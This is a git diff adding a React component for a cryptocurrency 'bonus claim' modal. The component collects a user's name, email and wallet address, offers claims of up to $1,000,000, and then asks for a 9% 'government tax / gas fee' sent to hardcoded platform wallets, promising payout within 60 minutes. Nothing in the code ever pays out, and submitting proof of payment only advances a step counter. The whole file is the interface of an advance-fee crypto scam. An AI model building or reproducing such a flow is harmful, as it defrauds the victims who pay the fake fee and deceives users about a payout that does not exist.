@@ -1,0 +1,447 @@
+import { useState, useRef, useMemo } from "react";
+import { motion, AnimatePresence } from "framer-motion";
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
+import { Button } from "@/components/ui/button";
+import {
+  ArrowRight,
+  ArrowLeft,
+  Upload,
+  CheckCircle2,
+  Copy,
+  Clock,
+  Wallet,
+  User,
+  Mail,
+  DollarSign,
+} from "lucide-react";
+import { useCoinPrices } from "@/hooks/useCoinPrices";
+
+const MODAL_SYMBOLS = ["BTC", "ETH", "BNB", "USDT", "SOL", "XRP"];
+
+const TAX_RATE = 0.09;
+
+const CLAIM_AMOUNTS = [
+  2500, 5000, 10000, 25000, 50000, 100000, 250000, 500000, 1000000,
+];
+
+// Each token has its own wallet address for tax/gas fee payment
+const PLATFORM_WALLETS: Record<string, string> = {
+  BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+  ETH: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
+  BNB: "bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2",
+  USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+  SOL: "7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV",
+  XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
+};
+
+interface ApplicationModalProps {
+  open: boolean;
+  onOpenChange: (open: boolean) => void;
+}
+
+const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
+  const coins = useCoinPrices(MODAL_SYMBOLS);
+
+  const [step, setStep] = useState(0);
+  const [fullName, setFullName] = useState("");
+  const [email, setEmail] = useState("");
+  const [walletAddress, setWalletAddress] = useState("");
+  const [selectedCoin, setSelectedCoin] = useState("BTC");
+  const [claimAmountUsd, setClaimAmountUsd] = useState(2500);
+  const [proofFile, setProofFile] = useState<File | null>(null);
+  const [txHash, setTxHash] = useState("");
+  const [copied, setCopied] = useState(false);
+  const fileRef = useRef<HTMLInputElement>(null);
+
+  const coin = coins.find((c) => c.symbol === selectedCoin)!;
+  const wallet = PLATFORM_WALLETS[selectedCoin] || PLATFORM_WALLETS.BTC;
+
+  // Bonus in crypto = claim amount USD / coin price (unaffected by tax)
+  const bonusCrypto = useMemo(() => {
+    if (!coin.price) return 0;
+    return claimAmountUsd / coin.price;
+  }, [claimAmountUsd, coin.price]);
+
+  // Tax calculated on the claim amount separately
+  const taxUsd = claimAmountUsd * TAX_RATE;
+  const taxCrypto = useMemo(() => {
+    if (!coin.price) return 0;
+    return taxUsd / coin.price;
+  }, [taxUsd, coin.price]);
+
+  const handleApply = () => {
+    setStep(1);
+  };
+
+  const handleCopy = () => {
+    navigator.clipboard.writeText(wallet);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleSubmitProof = () => {
+    setStep(3);
+  };
+
+  const handleClose = () => {
+    onOpenChange(false);
+    setTimeout(() => {
+      setStep(0);
+      setFullName("");
+      setEmail("");
+      setWalletAddress("");
+      setSelectedCoin("BTC");
+      setClaimAmountUsd(2500);
+      setProofFile(null);
+      setTxHash("");
+    }, 300);
+  };
+
+  const canApply = fullName.trim() && email.trim() && walletAddress.trim();
+  const canSubmitProof = txHash.trim() || proofFile;
+
+  return (
+    <Dialog open={open} onOpenChange={handleClose}>
+      <DialogContent className="sm:max-w-lg bg-card border-border overflow-hidden max-h-[90vh] overflow-y-auto">
+        <DialogHeader>
+          <DialogTitle className="font-display text-foreground">
+            {step === 0 && "Apply for Bonus"}
+            {step === 1 && "Your Bonus Allocation"}
+            {step === 2 && "Upload Proof of Payment"}
+            {step === 3 && "Application Submitted"}
+          </DialogTitle>
+        </DialogHeader>
+
+        {/* Step indicators */}
+        <div className="flex items-center gap-2 mb-4">
+          {[0, 1, 2, 3].map((s) => (
+            <div
+              key={s}
+              className={`h-1 flex-1 rounded-full transition-colors ${
+                s <= step ? "bg-primary" : "bg-border"
+              }`}
+            />
+          ))}
+        </div>
+
+        <AnimatePresence mode="wait">
+          {/* Step 0: Application form */}
+          {step === 0 && (
+            <motion.div
+              key="step0"
+              initial={{ opacity: 0, x: 20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: -20 }}
+              className="space-y-4"
+            >
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">Full Name</label>
+                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
+                  <User className="h-4 w-4 text-muted-foreground" />
+                  <input
+                    value={fullName}
+                    onChange={(e) => setFullName(e.target.value)}
+                    placeholder="John Doe"
+                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50"
+                  />
+                </div>
+              </div>
+
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">Email</label>
+                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
+                  <Mail className="h-4 w-4 text-muted-foreground" />
+                  <input
+                    type="email"
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    placeholder="john@example.com"
+                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50"
+                  />
+                </div>
+              </div>
+
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">Preferred Cryptocurrency</label>
+                <div className="grid grid-cols-3 gap-2">
+                  {coins.map((c) => (
+                    <button
+                      key={c.symbol}
+                      onClick={() => setSelectedCoin(c.symbol)}
+                      className={`glass-card rounded-lg px-3 py-2 text-sm font-medium transition-all ${
+                        selectedCoin === c.symbol
+                          ? "border-primary text-primary ring-1 ring-primary"
+                          : "text-muted-foreground hover:text-foreground"
+                      }`}
+                    >
+                      {c.symbol}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Your {selectedCoin} Wallet Address
+                </label>
+                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
+                  <Wallet className="h-4 w-4 text-muted-foreground" />
+                  <input
+                    value={walletAddress}
+                    onChange={(e) => setWalletAddress(e.target.value)}
+                    placeholder="Enter your wallet address"
+                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono"
+                  />
+                </div>
+              </div>
+
+              {/* Claim amount selector */}
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  <DollarSign className="h-3.5 w-3.5 inline mr-1" />
+                  Select Claim Amount
+                </label>
+                <div className="grid grid-cols-3 gap-2">
+                  {CLAIM_AMOUNTS.map((amt) => (
+                    <button
+                      key={amt}
+                      onClick={() => setClaimAmountUsd(amt)}
+                      className={`glass-card rounded-lg px-3 py-2 text-sm font-medium transition-all ${
+                        claimAmountUsd === amt
+                          ? "border-primary text-primary ring-1 ring-primary"
+                          : "text-muted-foreground hover:text-foreground"
+                      }`}
+                    >
+                      ${amt.toLocaleString()}
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              <Button
+                variant="hero"
+                className="w-full"
+                disabled={!canApply}
+                onClick={handleApply}
+              >
+                Submit Application
+                <ArrowRight className="ml-2 h-4 w-4" />
+              </Button>
+            </motion.div>
+          )}
+
+          {/* Step 1: Show allocated bonus + tax fee (separate) */}
+          {step === 1 && (
+            <motion.div
+              key="step1"
+              initial={{ opacity: 0, x: 20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: -20 }}
+              className="space-y-4"
+            >
+              <div className="text-center py-4">
+                <p className="text-muted-foreground text-sm mb-2">Your Bonus (Unaffected by Tax)</p>
+                <p className="text-4xl font-display font-bold gold-text">
+                  {bonusCrypto.toFixed(6)} {selectedCoin}
+                </p>
+                <p className="text-muted-foreground text-xs mt-1">
+                  ≈ ${claimAmountUsd.toLocaleString()}
+                </p>
+              </div>
+
+              <div className="glass-card rounded-xl p-4 space-y-3">
+                <div className="flex justify-between py-2 border-b border-border">
+                  <span className="text-muted-foreground text-sm">Bonus Amount</span>
+                  <span className="text-foreground font-medium text-sm">
+                    {bonusCrypto.toFixed(6)} {selectedCoin}
+                  </span>
+                </div>
+                <div className="flex justify-between py-2 border-b border-border">
+                  <span className="text-muted-foreground text-sm">Current {selectedCoin} Price</span>
+                  <span className="text-foreground font-medium text-sm">
+                    ${coin.price.toLocaleString(undefined, { maximumFractionDigits: 2 })}
+                  </span>
+                </div>
+                <div className="flex justify-between py-2 border-b border-border">
+                  <span className="text-muted-foreground text-sm">Government Tax / Gas Fee (9%)</span>
+                  <span className="text-primary font-medium text-sm">9%</span>
+                </div>
+                <div className="flex justify-between py-2 border-b border-border">
+                  <span className="text-muted-foreground text-sm">Tax Fee Payable</span>
+                  <div className="text-right">
+                    <span className="text-primary font-bold block">
+                      {taxCrypto.toFixed(6)} {selectedCoin}
+                    </span>
+                    <span className="text-muted-foreground text-xs">
+                      ≈ ${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}
+                    </span>
+                  </div>
+                </div>
+                <div className="flex justify-between py-2">
+                  <span className="text-muted-foreground text-sm">Disbursement Time</span>
+                  <span className="text-success font-medium text-sm flex items-center gap-1">
+                    <Clock className="h-3 w-3" /> 60 minutes
+                  </span>
+                </div>
+              </div>
+
+              <div className="glass-card rounded-lg p-3 bg-primary/5 border border-primary/20">
+                <p className="text-xs text-primary font-medium mb-1">
+                  ✦ Your full bonus of {bonusCrypto.toFixed(6)} {selectedCoin} remains unchanged
+                </p>
+                <p className="text-xs text-muted-foreground">
+                  The tax/gas fee is a separate payment required to process your claim.
+                </p>
+              </div>
+
+              <div>
+                <p className="text-muted-foreground text-xs mb-2">
+                  Pay the tax/gas fee to the {selectedCoin} wallet below:
+                </p>
+                <div className="glass-card rounded-lg px-3 py-2.5 flex items-center gap-2">
+                  <code className="text-xs text-foreground font-mono flex-1 break-all">
+                    {wallet}
+                  </code>
+                  <button
+                    onClick={handleCopy}
+                    className="text-primary hover:text-primary/80 shrink-0"
+                  >
+                    {copied ? (
+                      <CheckCircle2 className="h-4 w-4 text-success" />
+                    ) : (
+                      <Copy className="h-4 w-4" />
+                    )}
+                  </button>
+                </div>
+              </div>
+
+              <div className="flex gap-3">
+                <Button variant="outline" className="flex-1" onClick={() => setStep(0)}>
+                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
+                </Button>
+                <Button variant="hero" className="flex-1" onClick={() => setStep(2)}>
+                  I've Paid <ArrowRight className="ml-2 h-4 w-4" />
+                </Button>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Step 2: Upload proof */}
+          {step === 2 && (
+            <motion.div
+              key="step2"
+              initial={{ opacity: 0, x: 20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: -20 }}
+              className="space-y-4"
+            >
+              <p className="text-muted-foreground text-sm">
+                Upload your transaction hash or screenshot as proof of payment for{" "}
+                <span className="text-primary font-semibold">
+                  {taxCrypto.toFixed(6)} {selectedCoin}
+                </span>{" "}
+                <span className="text-muted-foreground text-xs">
+                  (≈ ${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })})
+                </span>
+              </p>
+
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Transaction Hash
+                </label>
+                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
+                  <input
+                    value={txHash}
+                    onChange={(e) => setTxHash(e.target.value)}
+                    placeholder="0x... or paste transaction ID"
+                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono"
+                  />
+                </div>
+              </div>
+
+              <div className="text-center text-muted-foreground text-xs">— or —</div>
+
+              <div>
+                <label className="text-sm text-muted-foreground mb-1.5 block">
+                  Upload Screenshot
+                </label>
+                <input
+                  ref={fileRef}
+                  type="file"
+                  accept="image/*"
+                  className="hidden"
+                  onChange={(e) => setProofFile(e.target.files?.[0] || null)}
+                />
+                <button
+                  onClick={() => fileRef.current?.click()}
+                  className="w-full glass-card rounded-lg px-4 py-6 flex flex-col items-center gap-2 hover:border-primary/50 transition-colors border border-dashed border-border"
+                >
+                  <Upload className="h-6 w-6 text-muted-foreground" />
+                  <span className="text-sm text-muted-foreground">
+                    {proofFile ? proofFile.name : "Click to upload screenshot"}
+                  </span>
+                </button>
+              </div>
+
+              <div className="flex gap-3">
+                <Button variant="outline" className="flex-1" onClick={() => setStep(1)}>
+                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
+                </Button>
+                <Button
+                  variant="hero"
+                  className="flex-1"
+                  disabled={!canSubmitProof}
+                  onClick={handleSubmitProof}
+                >
+                  Submit Proof <ArrowRight className="ml-2 h-4 w-4" />
+                </Button>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Step 3: Confirmation */}
+          {step === 3 && (
+            <motion.div
+              key="step3"
+              initial={{ opacity: 0, scale: 0.95 }}
+              animate={{ opacity: 1, scale: 1 }}
+              className="text-center py-6 space-y-4"
+            >
+              <div className="w-16 h-16 rounded-full bg-success/10 flex items-center justify-center mx-auto">
+                <CheckCircle2 className="h-8 w-8 text-success" />
+              </div>
+              <h3 className="font-display font-bold text-xl text-foreground">
+                Application Submitted!
+              </h3>
+              <p className="text-muted-foreground text-sm max-w-sm mx-auto">
+                Your proof of payment is being verified. Your full bonus of{" "}
+                <span className="text-primary font-semibold">
+                  {bonusCrypto.toFixed(6)} {selectedCoin}
+                </span>{" "}
+                (≈ ${claimAmountUsd.toLocaleString()}) will be sent to your wallet within{" "}
+                <span className="text-success font-semibold">60 minutes</span> after verification.
+              </p>
+              <div className="glass-card rounded-lg p-3 inline-flex items-center gap-2 text-sm">
+                <Clock className="h-4 w-4 text-primary" />
+                <span className="text-muted-foreground">Estimated wait:</span>
+                <span className="text-foreground font-semibold">60 minutes</span>
+              </div>
+              <div className="pt-2">
+                <Button variant="hero" onClick={handleClose}>
+                  Done
+                </Button>
+              </div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+      </DialogContent>
+    </Dialog>
+  );
+};
+
+export default ApplicationModal;
